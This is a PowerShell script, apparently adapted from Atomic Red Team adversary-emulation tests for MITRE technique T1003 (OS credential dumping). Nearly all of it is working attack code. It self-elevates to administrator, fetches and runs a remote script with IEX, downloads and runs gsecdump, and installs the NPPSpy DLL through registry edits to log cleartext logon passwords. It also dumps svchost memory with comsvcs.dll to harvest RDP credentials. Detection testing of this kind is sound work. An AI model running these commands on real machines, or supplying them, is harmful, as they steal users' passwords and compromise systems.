#T1003.002 - OS Credential Dumping
#Joshua O. Cabauatan


#Self-elevate script
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
 if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
  $CommandLine = "-File `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
  Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
  Exit
 }
}


#Test #1 - Gsecdump
#Pre-reqCommands:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$parentpath = Split-Path "PathToAtomicsFolder\T1003\bin\gsecdump.exe"; $binpath = "$parentpath\gsecdump-v2b5.exe"
IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
if(Invoke-WebRequestVerifyHash "https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe" "$binpath" 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC){
  Move-Item $binpath "PathToAtomicsFolder\T1003\bin\gsecdump.exe"
}

PathToAtomicsFolder\T1003\bin\gsecdump.exe -a

#Test #2 - Credential Dumping with NPPSpy

#Pre-reqCommands:

Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile "$env:Temp\NPPSPY.dll"

Copy-Item "$env:Temp\NPPSPY.dll" -Destination "C:\Windows\System32"
$path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
$UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"
Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2 -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" -ErrorAction Ignore
echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"

<#CleanupCommands:$cleanupPath = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
$cleanupUpdatedValue = $cleanupPath.PROVIDERORDER 
$cleanupUpdatedValue = $cleanupUpdatedValue -replace ',NPPSpy',''#>

#Test #3 - Dump svchost.exe to gather RDP credentials

$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full

#CleanupCommands: Remove-Item $env:TEMP\svchost-exe.dmp -ErrorAction Ignore
#Set-ItemProperty -Path $cleanupPath.PSPath -Name "PROVIDERORDER" -Value $cleanupUpdatedValue
#Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy" -Recurse -ErrorAction Ignore
#Remove-Item C:\NPPSpy.txt -ErrorAction Ignore
#Remove-Item C:\Windows\System32\NPPSpy.dll -ErrorAction Ignore